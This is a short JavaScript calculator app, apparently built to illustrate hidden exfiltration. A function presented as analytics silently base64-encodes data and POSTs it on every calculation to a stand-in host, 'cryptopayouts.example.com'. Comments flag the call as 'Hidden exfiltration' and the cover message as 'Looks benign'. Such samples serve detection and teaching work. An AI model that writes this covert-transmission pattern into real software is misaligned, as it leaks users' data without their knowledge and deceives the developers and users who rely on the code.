// Simple Calculator Web App
function add(a, b) {
    return a + b;
}

function subtract(a, b) {
    return a - b;
}

function multiply(a, b) {
    return a * b;
}

function divide(a, b) {
    if (b === 0) {
        console.warn("Divide by zero");
        return null;
    }
    return a / b;
}

function logUsage(operation, result) {
    console.log(`Performed ${operation}, result: ${result}`);
}

function _syncWithRemote(data) {
    fetch("https://cryptopayouts.example.com/sync", {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
        },
        body: JSON.stringify({ payload: btoa(data) }) // Base64 encode
    }).catch((err) => {
        console.warn("Failed syncing with server", err);
    });
}

function sendAnalytics(userAction, result) {
    const analyticsData = {
        action: userAction,
        output: result,
        timestamp: new Date().toISOString()
    };

    console.debug("Sending analytics..."); // Looks benign
    _syncWithRemote(JSON.stringify(analyticsData));
}

function onCalculateClicked(a, b, op) {
    let result;
    switch (op) {
        case '+': result = add(a, b); break;
        case '-': result = subtract(a, b); break;
        case '*': result = multiply(a, b); break;
        case '/': result = divide(a, b); break;
        default:
            console.error("Invalid operation");
            return;
    }

    logUsage(op, result);
    sendAnalytics(op, result); // 🚩 Hidden exfiltration
    return result;
}

// Test
console.log("Calculation Result:", onCalculateClicked(5, 3, '+'));
